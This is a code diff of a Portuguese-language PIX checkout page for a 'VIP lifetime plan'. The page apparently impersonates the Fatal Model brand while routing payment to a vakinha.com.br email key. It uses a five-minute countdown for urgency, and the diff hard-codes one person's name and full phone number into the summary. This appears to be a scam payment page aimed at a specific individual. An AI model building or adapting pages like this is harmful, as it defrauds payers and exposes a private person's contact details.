@@ -1,13 +1,10 @@
-<!DOCTYPE html>
 <html lang="pt-BR">
-<head>
-<meta charset="UTF-8">
-<title>Pagamento PIX – Plano VIP</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&family=Inter:wght@300;400;500&display=swap" rel="stylesheet">
-
-<style>
+ <head> 
+  <meta charset="UTF-8"> 
+  <title>Pagamento PIX – Plano VIP</title> 
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&amp;family=Inter:wght@300;400;500&amp;display=swap" rel="stylesheet"> 
+  <style>
 * { box-sizing: border-box; }
 
 body {
@@ -141,86 +138,62 @@ footer {
     font-size: 13px;
     line-height: 1.6;
 }
-</style>
-</head>
-
-<body>
-
-<header>
-    <div class="header-container">
-        <img src="logo.webp" alt="Fatal Model">
-    </div>
-</header>
-
-<div class="container">
-
-    <h1>Pagamento via PIX</h1>
-    <p class="subtitle">Plano VIP Vitalício • Pagamento único</p>
-
-    <div class="steps">
-        <p><strong>1.</strong> Copie a chave PIX abaixo.</p>
-        <p><strong>2.</strong> Acesse o aplicativo do seu banco.</p>
-        <p><strong>3.</strong> Vá em PIX → Copia e Cola e finalize o pagamento.</p>
-    </div>
-
-    <div class="pix-box" id="pixKey">
-00020126980014br.gov.bcb.pix01225749725@vakinha.com.br0250Compra do plano vip vitalicio da fatal model espec52040000530398654045.995802BR5911Fatal model6009Sao Paulo62070503***63047D62
-    </div>
-
-    <button class="copy-btn" onclick="copyPix()">Copiar chave PIX</button>
-
-    <div class="qr">
-        <img src="qr.webp" alt="QR Code PIX">
-        <p>Escaneie o QR Code se preferir</p>
-    </div>
-
-    <div class="timer" id="timer">Tempo restante: 05:00</div>
-
-    <!-- EXTRATO -->
-    <div class="statement">
-        <h2>Resumo da Transação</h2>
-
-        <p><strong>Nome:</strong> <span id="nome"></span></p>
-        <p><strong>Telefone:</strong> <span id="telefone"></span></p>
-        <p><strong>E-mail:</strong> xxxxxxx@xxxxx.com</p>
-
-        <hr>
-
-        <div class="line">
-            <span>Taxa</span>
-            <span>R$ 0,00</span>
-<span>R$ 0,00</span>
-        </div>
-        <div class="line total">
-            <span>Valor total</span>
-            <span>R$ 19,99</span>
-        </div>
-
-        <hr>
-
-        <p><strong>Detalhes do Plano:</strong></p>
-        <p>
-            • Selo VIP de destaque<br>
-            • Prioridade em anúncios<br>
-            • Participação em promoções e sorteios<br>
-            • Maior visibilidade no perfil
-        </p>
-
-        <p><strong>Observação:</strong> O pagamento é efetuado
-        <strong>somente uma vez</strong>, sem cobranças mensais ou renovações automáticas.</p>
-
-        <p><strong>CNPJ:</strong> 37.181.811/0001-46</p>
-    </div>
-
-</div>
-
-<footer>
-    © 2026 Fatal Model <br>
-    Pagamento seguro via PIX <br>
-    WhatsApp: (11) 94533-6003
-</footer>
-
-<script>
+</style> 
+ </head> 
+ <body> 
+  <header> 
+   <div class="header-container"> 
+    <img src="logo.webp" alt="Fatal Model"> 
+   </div> 
+  </header> 
+  <div class="container"> 
+   <h1>Pagamento via PIX</h1> 
+   <p class="subtitle">Plano VIP Vitalício • Pagamento único</p> 
+   <div class="steps"> 
+    <p><strong>1.</strong> Copie a chave PIX abaixo.</p> 
+    <p><strong>2.</strong> Acesse o aplicativo do seu banco.</p> 
+    <p><strong>3.</strong> Vá em PIX → Copia e Cola e finalize o pagamento.</p> 
+   </div> 
+   <div class="pix-box" id="pixKey">
+     00020126850014br.gov.bcb.pix01225749725@vakinha.com.br0237Pagamento do plano vip da fatal Model520400005303986540519.995802BR5921FATAL MODEL ILIMITADO6009Sao Paulo62070503***630449A4 
+   </div> 
+   <button class="copy-btn" onclick="copyPix()">Copiar chave PIX</button> 
+   <div class="qr"> 
+    <img src="qr.webp" alt="QR Code PIX"> 
+    <p>Escaneie o QR Code se preferir</p> 
+   </div> 
+   <div class="timer" id="timer">
+    Tempo restante: 05:00
+   </div> 
+   <!-- EXTRATO --> 
+   <div class="statement"> 
+    <h2>Resumo da Transação</h2> 
+    <p><strong>Nome:</strong> <span id="nome">Francisco S</span></p> 
+    <p><strong>Telefone:</strong> <span id="telefone">85998796480</span></p> 
+    <p><strong>E-mail:</strong> xxxxxxx@xxxxx.com</p> 
+    <hr> 
+    <div class="line"> 
+     <span>Taxa</span> 
+     <span>R$ 0,00</span> 
+     <span>R$ 0,00</span> 
+    </div> 
+    <div class="line total"> 
+     <span>Valor total</span> 
+     <span>R$ 19,99</span> 
+    </div> 
+    <hr> 
+    <p><strong>Detalhes do Plano:</strong></p> 
+    <p> • Selo VIP de destaque<br> • Prioridade em anúncios<br> • Participação em promoções e sorteios<br> • Maior visibilidade no perfil </p> 
+    <p><strong>Observação:</strong> O pagamento é efetuado <strong>somente uma vez</strong>, sem cobranças mensais ou renovações automáticas.</p> 
+    <p><strong>CNPJ:</strong> 37.181.811/0001-46</p> 
+   </div> 
+  </div> 
+  <footer>
+    © 2026 Fatal Model 
+   <br> Pagamento seguro via PIX 
+   <br> WhatsApp: (11) 94533-6003 
+  </footer> 
+  <script>
 /* PEGAR PARÂMETROS */
 const params = new URLSearchParams(window.location.search);
 document.getElementById("nome").textContent = params.get("nome") || "—";
@@ -244,7 +217,6 @@ setInterval(() => {
     timerEl.textContent = `Tempo restante: ${m}:${s}`;
     if (time > 0) time--;
 }, 1000);
-</script>
-
-</body>
+</script> 
+ </body>
 </html>
